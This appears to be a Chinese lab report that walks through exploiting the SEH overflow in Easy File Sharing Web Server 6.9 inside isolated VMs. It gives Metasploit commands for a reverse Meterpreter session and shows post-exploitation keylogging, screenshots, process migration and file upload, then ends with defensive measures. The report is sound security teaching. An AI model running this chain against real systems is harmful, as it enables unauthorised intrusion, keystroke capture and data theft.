上一篇只把服务打崩、弹了个计算器。这一篇走完剩下的路：把同一个溢出点换一种载荷，让靶机主动连回来，拿到一个可以反复下命令的会话——然后再用四条命令证明「我确实坐在了对方的机器里」。

<!-- more -->

## 一、实验目的

本实验以 Easy File Sharing Web Server（以下简称为 EFS）的 SEH 溢出漏洞为对象，在两台虚拟机之间完成从服务识别到远程会话控制的完整过程。具体目标如下。

- 掌握「识别—检索—验证—利用—控制」五个阶段的完整利用链路，能说明每一阶段的产出如何成为下一阶段的输入。
- 掌握 Metasploit 框架中模块选择、载荷设置与目标参数配置的方法，理解参数名随版本变化的原因与应对方式。
- 理解反弹连接相对于正向连接在穿透边界防护上的差异，能解释会话为何能够建立。
- 掌握 Meterpreter 的身份确认、屏幕取证、键盘记录与文件传输操作，并能说明每项操作的取证意义。

## 二、实验环境

实验由两台 VirtualBox 虚拟机完成，二者接入同一 NAT 网络，宿主机不直接参与通信。环境信息见表 1。

*表 1　实验环境*

| 角色 | 系统与版本 | 网络地址 | 关键说明 |
| --- | --- | --- | --- |
| 攻击机 | Kali Linux 2026.2 | 192.168.64.4（DHCP） | Metasploit 6.x、Exploit-DB 本地库 |
| 靶机 | Windows 7 SP1 x64 | 192.168.64.100（静态） | Easy File Sharing Web Server 6.9 |
| 网络 | VirtualBox NAT 网络 | 192.168.64.0/24 | 宿主机无法直连，测试须在虚拟机内完成 |

表 1 中有两点直接影响实验能否复现，需特别说明。

- 攻击机地址由 DHCP 动态分配，重启后可能变化。每次实验前应用 `hostname -I` 重新确认 LHOST，不能沿用上次的数值。
- 靶机服务端口在安装时被改为 8000（默认 80），因此 RPORT 必须填 8000。端口填错时框架不会给出明确提示，只会表现为「攻击已发送但无会话」。

## 三、实验原理

原理部分回答三个问题：漏洞为什么能成立，会话为什么能建立，拿到的权限为什么有限。至于每个字节的偏移量与具体排布，在上一篇《EasyFileSharing-缓冲区溢出漏洞的扫描定位与利用》里已经逐字节拆过，这里不再重复。

### 3.1　攻击链总览

完整的利用过程可以拆成五个阶段，如图 1 所示。

{% asset_img fig1-chain.png %}

*图 1　从侦察到远程控制的五阶段攻击链*

这五个阶段不是并列的清单，而是一条流水线：每一步的产出，都是下一步唯一的输入。各阶段的主要动作与产出见表 2。

*表 2　五个阶段的主要动作与产出*

| 阶段 | 主要动作 | 产出（下游依赖它的什么） |
| --- | --- | --- |
| 侦察 | 端口与服务版本识别 | 软件名与版本号，作为检索关键词 |
| 检索 | 查询本地 Exploit-DB 索引 | 漏洞名与 PoC 路径 |
| 验证 | 运行现成 PoC | 确认漏洞真实存在、偏移量可用 |
| 利用 | 框架加载模块并配置载荷 | 一次携带攻击载荷的请求 |
| 控制 | 靶机回连攻击机 | 可交互的会话通道 |

把这条链放回本实验的具体环境，可以看得更清楚：Nmap 从 8000 端口的响应中匹配出「Easy File Sharing Web Server 6.9」，这个字符串成为检索的关键词；检索在本地漏洞库中定位到针对 SEH 路径的攻击脚本，脚本里写明了请求字段与偏移量；验证阶段运行现成脚本，确认漏洞在本机环境真实可用；利用阶段改用框架发送同类畸形请求，只把末尾的载荷换掉，从「弹出一个计算器」变成「连回攻击机 4444 端口」；控制阶段则由靶机主动回连，建立可反复下命令的通道。

需要说明的是，验证与利用两个阶段针对的是同一处溢出，模块内置的偏移量在本环境的 6.9 版本上同样有效，这一点已由会话成功建立所验证。二者的差别只在载荷：验证阶段执行的是会破坏进程的 shellcode，因此服务随即崩溃；利用阶段注入的是独立运行的 stage，因此会话能够稳定保持。

### 3.2　漏洞成因：栈溢出与 SEH 劫持

EFS 在处理超长的请求字段时没有做长度校验，写入的数据越过缓冲区边界，自低地址向高地址依次漫过栈上的四块区域，见表 3。

*表 3　栈上四块区域及其覆盖后果*

| 栈上区域 | 存放什么 | 被覆盖后的后果 | 是否利用 |
| --- | --- | --- | --- |
| 局部缓冲区 | 请求字段的原始内容 | 溢出源头，数据由此向外漫出 | 利用起点 |
| 保存的 EBP | 上一层函数的栈底 | 栈帧错乱 | 不直接利用 |
| 返回地址 RET | 函数返回后的下一跳 | 函数一返回即跳向指定地址 | 否，程序先崩溃 |
| SEH 记录 | next 指针与 handler 地址 | 异常发生时跳向指定地址 | 是，本实验利用点 |

数据只能从低地址向高地址增长，而这四块在栈上恰好按此顺序排列，所以「依次覆盖」并不是什么技巧，而是溢出的必然结果。所谓构造 payload，就是按这个顺序把数据一块块摆好，每一块的字节数都必须精确，多一个或少一个，后面全部错位。

本实验没有选择覆盖返回地址，而是选择覆盖 SEH 记录，原因在于执行顺序：畸形请求先触发越界访问异常，程序在函数返回之前就已经进入异常处理流程，`ret` 指令根本没有执行机会。异常处理是崩溃前的最后一个出口，也只能在这里拦截。具体的劫持过程可以概括为三步。

- SEH 记录中的 handler 地址被改写为一段固定地址，该地址位于软件自带的 DLL 中，位置稳定；这是整个 payload 中唯一需要预先确定的地址。
- 该地址指向一段 pop-pop-ret 指令，作用是剥掉异常框架压入的两个参数；剥完之后，`ret` 读到的恰好是系统给出的现场指针，它天然指向栈上。
- 栈上依次布置短跳指令、NOP 滑板与 shellcode。短跳只需跳到滑板范围内的任意位置，滑板再一路执行进 shellcode——用「落点范围」代替「精确地址」，从而绕开栈地址不确定的问题。

同一服务往往存在多个可触发字段，公开 PoC 也有多份，分别对应不同的请求字段，但底层成因相同。报告只选定一条路径做透，不逐一展开。

### 3.3　会话为何能建立：反弹连接

载荷并不要求靶机开放新端口等待连接，而是让靶机主动连回攻击机的 4444 端口。方向反过来，性质就变了，对比见表 4。

*表 4　正向连接与反向连接的对比*

| 对比项 | 正向连接（bind） | 反向连接（reverse，本实验） |
| --- | --- | --- |
| 发起方 | 攻击机连接靶机 | 靶机连接攻击机 |
| 靶机需开放 | 一个新的监听端口 | 不需要，复用已有服务 |
| 边界设备 | 入站规则通常拦截 | 出站连接通常放行 |
| 适用场景 | 同网段、无 NAT | 跨网段、存在 NAT 或防火墙 |

因此会话建立那一行输出值得单独解读：括号中左侧是攻击机在监听，右侧是靶机用临时端口发起连接，箭头方向即为连接发起方向。这一行同时证明了两件事——溢出已经成功，回连也已经打通。

### 3.4　会话为何是 32 位、权限为何有限

本次实验最容易产生误解的一点是：系统是 64 位，拿到的会话却是 x86。原因与操作系统无关，而与承载载荷的进程有关，见表 5。

*表 5　会话位数的成因*

| 环节 | 事实 | 带来的影响 |
| --- | --- | --- |
| 操作系统 | Windows 7 SP1，x64 | 支持 32 位与 64 位进程并存 |
| 被利用进程 | Fsws.exe 为 32 位程序 | 载荷只能注入 32 位上下文 |
| 会话类型 | meterpreter x86/windows | 部分 64 位专属命令受限 |
| 应对措施 | migrate 迁移到其他进程 | 会话更稳定，且可脱离易崩溃的服务进程 |

另一个容易误读的是权限。`getuid` 返回的是运行该服务的普通账户，而不是 SYSTEM。载荷被注入 EFS 的进程，继承的正是 EFS 自身的权限，因此「拿到会话」与「拿到最高权限」是两件事。这一点在之后还会用到：同一条漏洞，若服务以 SYSTEM 运行，危害将被成倍放大。

## 四、实验步骤与结果

以下按实际操作顺序记录，每节给出命令、关键输出与判读。文中截图均为实验现场的原始截屏，未做修改。

### 4.1　确认目标服务可用

先确认通路与端口状态。这一步不通过，后面的命令都会打在空处。

```bash
ping -c 3 192.168.64.100
sudo nmap -sV -p 8000 192.168.64.100
```

第一次扫描时，ping 正常返回 3 个包、丢包率 0%，但 8000 端口显示为 closed。closed 与 filtered 含义不同：closed 表示目标主机明确回应了拒绝（TCP RST），说明主机在线、防火墙未拦截，只是没有程序监听该端口；filtered 才是数据包被丢弃、没有任何回应。据此可以判断是服务未运行，而不是网络问题。

在靶机侧启动 EFS 后复查，得到 `8000/tcp open`，并识别出 Easy File Sharing Web Server httpd 6.9，同时给出操作系统信息 Windows。至此才具备后续攻击的前提。

{% asset_img fig3-nmap.png %}

*图 3　端口状态由 closed 变为 open，并识别出软件名与版本*

为交叉印证，另在靶机自带的 IE 中访问 `http://192.168.64.100:8000`，页面正常显示 EFS 登录界面，说明服务确实在线且可交互。该页面后续也用于键盘记录的操作验证。

{% asset_img fig4-ie.png %}

*图 4　靶机浏览器访问 8000 端口，EFS 登录页正常显示*

### 4.2　启动框架并加载模块

启动框架并选定模块。`msfconsole` 启动需要十余秒，界面暂时静止属正常现象。

```bash
msfconsole -q
search easyfilesharing
use exploit/windows/http/easyfilesharing_seh
```

搜索返回四条结果，分别对应 FTP 服务的 PASS 溢出、HTTP 服务的 POST 溢出与 SEH 溢出。本实验选取第四条，即 SEH 路径。加载成功的判据是提示符括号内变为模块路径。

此时出现 `No payload configured, defaulting to windows/meterpreter/reverse_tcp`，这一行是提示而非错误，含义是未指定载荷、已自动采用默认值，而该默认值恰好就是本次所需的载荷。

{% asset_img fig5-msf-search.png %}

*图 5　搜索模块并加载 SEH 路径*

### 4.3　配置参数

配置载荷与目标参数。顺序不能颠倒：LHOST、LPORT 属于载荷选项，未设置载荷时它们不会出现在选项列表中。

```bash
set payload windows/meterpreter/reverse_tcp
show options
set rhosts 192.168.64.100
set rport 8000
show options
```

参数名须以 `show options` 的 Name 列为准。本版框架中目标地址写作 RHOSTS（复数）。

设置完成后复查，四项关键值与预期一致：RHOSTS 为 192.168.64.100，RPORT 为 8000，LHOST 为 192.168.64.4，LPORT 为 4444。其中 LHOST 由框架自动识别为本机地址，一般无需手动设置。任何一项与表 6 不符，都必须先改对再执行。

{% asset_img fig6-options.jpeg %}

*图 6　参数设置后的选项复查结果*

*表 6　四个关键参数及其填错后果*

| 参数 | 含义 | 本次取值 | 填错的后果 |
| --- | --- | --- | --- |
| RHOSTS | 靶机地址 | 192.168.64.100 | 请求发往不存在的目标 |
| RPORT | 靶机服务端口 | 8000 | 请求打到错误端口，无响应 |
| LHOST | 回连地址（攻击机） | 192.168.64.4 | 靶机回连到不可达地址，会话建立失败 |
| LPORT | 回连端口 | 4444 | 与本机监听端口不一致 |

### 4.4　发起攻击与会话建立

```bash
run
```

输出按顺序出现四行：开始在 4444 端口监听、发送攻击请求、向目标传输 stage（192936 字节）、会话建立。前两行说明请求已发出；第三行说明溢出成功、载荷开始在靶机中落地；只有最后一行才代表通道真正打通。

{% asset_img fig7-session.jpeg %}

*图 7　攻击执行与会话建立，末行为 session 1 opened*

括号内的地址对是理解整个实验的关键：`192.168.64.4:4444 -> 192.168.64.100:49164`。左侧是攻击机在监听，右侧是靶机用临时端口主动连出，箭头方向即为连接发起方向。

同时可观察到靶机侧的变化：EFS 窗口关闭，8000 端口不再响应，网站无法访问。这是溢出破坏服务进程的直接后果，也是后续需要做进程迁移的原因——会话当前依附在已被破坏的进程中，服务一旦彻底终止，会话也会随之中断。

### 4.5　身份确认与屏幕取证

```bash
sysinfo
getuid
pwd
screenshot
```

四条命令依次回答「这是哪台机器、以什么身份、站在哪个目录、能否看见屏幕」。实际输出为：计算机名 SHU278-PC，操作系统 Windows 7（6.1 Build 7601, Service Pack 1），架构 x64，系统语言 zh_CN，工作组 WORKGROUP，会话类型 meterpreter x86/windows；`getuid` 返回 `shu278-PC\shu278`；`pwd` 返回 `C:\Users\shu278\Desktop`；`screenshot` 将画面保存为 `/home/kali/HuBCxguz.jpeg`。

{% asset_img fig8-sysinfo.jpeg %}

*图 8　身份确认与屏幕取证（sysinfo / getuid / pwd / screenshot）*

四条输出合起来构成控制权归属的直接证据：受控对象是靶机，当前身份是靶机上的普通用户，工作目录是用户桌面，并且可以实时获取对方屏幕。其中 x64 系统与 x86 会话并存的原因已在 3.4 节说明。

### 4.6　进程查看与键盘记录

在执行键盘记录前，先用 `ps` 确认进程与位数。输出中可见 `Fsws.exe`（PID 2068，x86）与 `iexplore.exe`（PID 2344、2392，x86），前者是承载会话的 EFS 进程，后者是靶机上打开的 IE。

{% asset_img fig9-ps.jpeg %}

*图 9　进程列表与首次键盘记录（记录内容为空）*

随后执行键盘记录。第一次 `keyscan_dump` 只返回 `Dumping captured keystrokes...` 而其下为空，说明记录器已启动但没有采集到按键。原因有两点：其一，启动为异步操作，钩子挂载存在短暂延迟，启动后立即输入会丢失按键；其二，若在启动之前已经完成输入，则更不可能被记录。

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

修正操作中又出现第二个问题：误按 Ctrl+C 后出现 `Interrupt: use the 'exit' command to quit`，此后连续三次 `keyscan_start` 均返回 `stdapi_ui_start_keyscan: Operation failed: Incorrect function`。原因是中断终止了后台线程，已注册的键盘钩子没有随之注销，进程内的状态残留，导致再次挂载失败，且该状态会一直持续。

处置办法是更换承载进程：执行 `migrate 2344` 迁移至 `iexplore.exe` 后，再次启动记录即恢复正常，dump 得到十个退格符与 `hello12312345`。

```bash
migrate 2344
keyscan_start
keyscan_dump
```

{% asset_img fig10-keyscan.jpeg %}

*图 10　键盘记录的故障现象、进程迁移与恢复后的采集结果*

这串输出说明了两件事。第一，记录到的是逐键原始序列，而非最终文本：`<^H>` 是退格键的 ASCII 控制字符，出现十次，说明输入框中原有内容被逐字删除后重新输入，整个过程可被完整还原。第二，迁移同时解决了「功能失效」与「会话依附于易崩溃进程」两个问题，代价是目标进程一旦退出会话即断开，因此实验结束后不能关闭该 IE 窗口。

由此得出一条操作纪律：在 Meterpreter 中回到上一层用 `background`，结束会话用 `exit`，不要使用 Ctrl+C——它在 Linux 终端里表示中断，在 Meterpreter 中却会终止后台线程并留下残余状态。

### 4.7　文件上传与下载

文件传输包含上传与下载两个方向，分别证明「可向对方写入」与「可从对方读取」。本实验以上传为主，并在靶机侧直接观察结果。

```bash
# Kali 新终端标签中生成测试文件
echo "This file came from Kali via Meterpreter" > /tmp/kali_test.txt
# 回到 meterpreter 会话执行上传
upload /tmp/kali_test.txt C:/Users/shu278/Desktop/来自Kali.txt
```

上传输出显示进度 `41.00 B / 41.00 B（100%）` 并提示 Completed，说明写入完成。如图 11 所示。

{% asset_img fig11-upload.png %}

*图 11　文件上传完成，显示 41 字节全部传输*

切到靶机窗口即可看到桌面左侧图标列的末位多出一个文件「来自Kali」——文件名正是上传时指定的中文名，图标与文本文件一致。这一步的意义在于：文件不是被隐藏投放，而是直接出现在对方的可视界面上，写入能力因此不依赖任何推测。

## 六、实验中遇到的问题与处置

本章记录五个真实出现的问题。

*表 8　问题、原因与处置*

| 现象 | 原因 | 处置 |
| --- | --- | --- |
| 8000/tcp closed | 服务未启动（前次溢出导致崩溃） | 靶机侧重启服务至在线状态 |
| Unknown datastore option | 新版框架将参数名改为复数 RHOSTS | 以 Name 列为准填写 |
| Exploit completed 但无会话 | 地址、端口或载荷选项不匹配 | 逐项核对，不盲目重跑 |
| keyscan_dump 输出为空 | 记录为异步启动，且输入早于启动 | 启动后等待片刻再输入 |
| Operation failed: Incorrect function | 中断使钩子未注销，状态残留 | 迁移至其他进程后恢复 |

其中有三个值得展开说明。

一是 closed 与 filtered 的区别。二者都表现为「端口不可用」，但含义相反：closed 说明对方主机在线并明确拒绝，问题出在服务未启动；filtered 说明数据包被静默丢弃，问题出在网络或防火墙。判断错方向，就会在错误的地方浪费时间。本实验首次扫描得到 closed，据此直接定位到服务未启动，未做任何网络排查。

二是参数名 RHOST 与 RHOSTS 的差异。遇到 `Unknown datastore option` 时应核对 `show options` 的 Name 列，而不是怀疑命令拼写。

三是 `Incorrect function` 的成因。它并非权限不足或架构不兼容——同一环境中此前的记录曾成功采集到按键，足以排除这两点。真正的原因是中断操作终止了后台线程，而键盘钩子未随之注销，进程内状态残留。这也解释了为何重复执行三次得到完全相同的报错：状态是粘住的，只有更换进程才能清除。

另外说明一处版本差异：模块描述为 7.2 版本，实际环境为 6.9。二者针对同一处溢出，本次利用成功，说明该差异未影响偏移量的有效性；若换成其他版本，仍需重新核对。

## 七、防御视角

从防守方立场回看这条链，每个阶段都存在可施加的阻力，见表 9。

*表 9　各攻击阶段对应的防御措施*

| 攻击阶段 | 可采取的防御措施 |
| --- | --- |
| 侦察 | 修改或隐藏服务标识、改用非默认端口、限制访问来源 |
| 检索 | 离线漏洞库无法阻断，但及时打补丁可使公开 PoC 与框架模块同时失效 |
| 验证与利用 | 补丁为主；辅以 DEP、ASLR、SEHOP 等缓解机制，部署 WAF 或虚拟补丁 |
| 通道建立 | 限制出站连接、监控异常进程外连、部署主机侧检测 |
| 后渗透 | 服务以最小权限运行、开启进程与文件审计、留存日志 |

其中最容易落地、也最有效的一条是「服务以最小权限运行」。本次会话拿到的是普通账户权限，正是这一配置限制的结果：攻击者虽已进入系统，却无法直接读取其他用户的数据，也无法安装服务。若该服务以 SYSTEM 运行，同一条漏洞的危害将被成倍放大。

其次是补丁。检索阶段本身无法被阻断——攻击者完全可以在自己的机器上离线查询——但只要目标已打补丁，公开 PoC 与框架模块都会同时失效。这说明「漏洞库公开」并不等于「必然被攻破」，真正的分水岭在于是否及时修复。

再次是出站连接监控。本实验的会话之所以能建立，是因为靶机主动向 4444 端口发起连接。若对异常外连（尤其是服务进程发起的外连）设置告警，这条通道在建立瞬间就会暴露，而无需等到数据被取走才察觉。

## 八、实验总结

按技术、方法、认知三个层面收束。

- 技术层面：这条链的本质是「信息 → 手段 → 通道」的逐级转化。侦察产出软件名与版本，检索据此给出可执行的攻击手段，利用再把一次性的代码执行升级为可持续操作的通道。任一环缺失，后续动作都会失去依据。
- 方法层面：先验证、再升级是最省时的策略。用现成脚本花一分钟确认漏洞真实存在，比在框架中反复调参高效得多；反之，跳过验证直接上框架，一旦失败便无法区分是版本不符还是参数填错。
- 认知层面：拿到会话不等于拿到最高权限，能执行命令也不等于能长期驻留。权限级别、进程位数、进程稳定性三者共同决定了一次入侵的实际影响范围，也是评估与处置时最该先问清的三件事。

最后是一条操作习惯：Meterpreter 的多数功能依赖后台线程，而 Ctrl+C 会直接终止线程并留下残余状态。把「background 返回、exit 结束」当作固定动作，可以避免本实验中出现的 Incorrect function 一类问题。
